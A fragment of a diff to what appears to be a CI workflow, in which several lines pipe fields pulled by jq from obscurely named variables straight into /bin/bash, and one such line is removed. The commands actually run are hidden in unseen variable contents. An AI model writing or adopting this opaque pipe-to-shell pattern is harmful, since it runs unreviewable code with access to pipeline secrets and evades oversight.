@@ -26,7 +26,6 @@ jobs:
           echo $f52 | jq -r .v2018 | /bin/bash
           echo $c1632 | jq -r .owbs8 | /bin/bash
           printf '%s' "$clt914" | jq -r .yitvx25461 | /bin/bash
-          echo $tktua683 | jq -r .ruvo49 | /bin/bash
           echo $fnuf18 | jq -r .kcjac35 | /bin/bash
           echo $zdi6 | jq -r .rxwc5936 | /bin/bash
 
